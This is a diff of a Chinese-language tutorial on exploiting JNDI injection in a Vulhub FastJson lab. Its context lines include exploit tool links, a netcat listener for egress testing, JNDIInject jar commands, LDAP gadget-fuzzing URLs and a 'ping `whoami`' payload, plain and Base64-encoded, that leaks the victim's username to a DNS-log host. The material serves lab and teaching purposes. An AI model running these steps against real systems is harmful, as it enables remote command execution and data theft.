@@ -7,32 +7,33 @@ tags: [jndi, 注入, log4j, java, lookup]
 
 ## 0x01 前言
 
-```plain
+```
 对于新手来说,如何利用JNDI进行攻击是一脸懵逼的,而现学原理明显也不太现实
 本篇文章将从实际出发,尽量少的讲原理,更多的讲如何利用JNDI漏洞
 让我们先会学会如何利用
 ```
 
-```plain
+```
 首先现在常拿来攻击的协议就两种:RMI与LDAP
 而且在大部分情况下LDAP都可以完美的覆盖RMI
 因此一般都是先使用LDAP协议进行攻击测试,如果失败了在换RMI试试
 ```
 
 ## 0x02 利用的工具推荐
+
 | JNDI工具名称 | 地址 |
-| --- | --- |
+|---|---|
 | JNDI | https://github.com/su18/JNDI |
 | JNDIEXP | https://github.com/Bl0omZ/JNDIEXP |
 
 
-```plain
+```
 这些大佬已经替我们编译好了,找到项目的tags进行下载即可
 ```
 
 ## 0x03 漏洞环境搭建
 
-```plain
+```
 准备起一个FastJson的漏洞环境,进行JNDI的攻击测试
 
 这里我使用的是 phith0n师傅 的 Vulhub 直接搭建的
@@ -42,14 +43,14 @@ github地址: https://github.com/vulhub/vulhub
 安装方法可以查看: https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md
 ```
 
-```plain
+```
 安装之前记得输入命令: pwd  查看当前的目录
 不然到时候安装在哪里都不知道那就尴尬了。
 
 例如我的安装地址: /usr/share/vulhub-master
 ```
 
-```plain
+```
 # 启动docker
 systemctl start docker
 
@@ -71,7 +72,7 @@ cd /usr/share/vulhub-master/fastjson/1.2.47-rce/
 那么 编译,启动,删除 都是这个环境的东西
 ```
 
-```plain
+```
 执行完 docker-compose up -d 以后
 
 your-ip = 服务器的ip 而不是 docker 的ip 
@@ -88,7 +89,7 @@ your-ip = 服务器的ip 而不是 docker 的ip
 
 
 
-```plain
+```
 // 漏洞测试的数据包
 // 通过该数据包确定漏洞触发点
 POST / HTTP/1.1
@@ -122,27 +123,27 @@ Content-Length: 258
 
 ## 0x04 整体环境说明
 
-```plain
+```
 A服务器-攻击者服务器IP: 192.168.24.1
 B服务器-受害者服务器IP: 192.168.24.129
 ```
 
 ## 0x05 目标服务器出网判断
 
-```plain
+```
 在测试JNDI漏洞时,最重要的要求就是协议出网,如果不出网那就无法利用JNDI漏洞
 因此判断是不是出网的在初期还是比较重要的
 ```
 
 ## 0x05.1 利用netcat判断是否出网
 
-```plain
+```
 第一步: 进入攻击者服务器
 第二步: 执行:netcat -vv -l -p 8088
 第三步: 发送数据包测试是否出网
 ```
 
-```plain
+```
 // 攻击者发送该数据包
 POST / HTTP/1.1
 Host: 192.168.24.129:8090
@@ -173,7 +174,7 @@ Content-Length: 255
 
 ## 0x06 JNDI注入(少用)
 
-```plain
+```
 jndi注入,需要被受害者,访问VPS上的ldap服务
 然后ldap服务要求被受害者访问并加载一个http服务上的class
 
@@ -184,7 +185,7 @@ JDK增加了com.sun.jndi.ldap.object.trustURLCodebase选项,默认为false
 所以如果有时,你发现ldap有请求,但是http服务没有请求,那说明JDK版本限制了
 ```
 
-```plain
+```
 // 第一步
 // 操作对象: 攻击方
 // 进入su18师傅的JNDI项目,执行如下命令,启动该项目
@@ -195,7 +196,7 @@ JDK增加了com.sun.jndi.ldap.object.trustURLCodebase选项,默认为false
 
 
 
-```plain
+```
 // 第二步
 // 操作对象: 攻击方
 // 进入su18师傅的JNDI项目,打开config.properties
@@ -211,7 +212,7 @@ Base64编码: cGluZyBgd2hvYW1pYC4wcHM1M2QuZG5zbG9nLmNu
 
 
 
-```plain
+```
 // 第三步
 // 操作对象: 攻击方
 // 命令执行,发包测试
@@ -250,7 +251,7 @@ Content-Length: 264
 ## 0x07 JNDI高版本JDK反序列化绕过(常用)
 ## 0x07.1 JNDIInject-[version]-SNAPSHOT.jar - 基本使用
 
-```plain
+```
 // 输出-使用说明
 命令: java -jar JNDIInject-[version]-SNAPSHOT.jar -i [vps-ip] -u
 命令: java -jar JNDIInject-1.2-SNAPSHOT.jar -i 192.168.24.1 -u
@@ -260,7 +261,7 @@ Content-Length: 264
 
 ## 0x07.2 JNDIInject-[version]-SNAPSHOT.jar - 项目启动
 
-```plain
+```
 // 操作对象: 攻击方
 // 进入Bl0omZ师傅的JNDI项目,执行如下命令,启动该项目
 语法: java -jar JNDIInject-[version]-SNAPSHOT.jar -i [vps-ip]
@@ -271,7 +272,7 @@ Content-Length: 264
 
 ## 0x07.3 通过dnslog获取反序列化链
 
-```plain
+```
 输入: ldap://192.168.24.1:1389/fuzzbyDNS/[dnslog]
 这样就会自动去爆破链了
 ```
@@ -280,7 +281,7 @@ Content-Length: 264
 
 
 
-```plain
+```
 // 运行该数据包,然后查看dnslog即可
 POST / HTTP/1.1
 Host: 192.168.24.129:8090
@@ -315,7 +316,7 @@ Content-Length: 286
 
 ## 0x07.4 反序列化链攻击测试
 
-```plain
+```
 按照上面跑出来的链,可以运行el,执行命令
 
 例如: ping `whoami`.rwg72h.dnslog.cn
@@ -328,7 +329,7 @@ Base64编码: cGluZyBgd2hvYW1pYC5yd2c3MmguZG5zbG9nLmNu
 
 
 
-```plain
+```
 // 运行该数据包,然后查看dnslog即可
 POST / HTTP/1.1
 Host: 192.168.24.129:8090
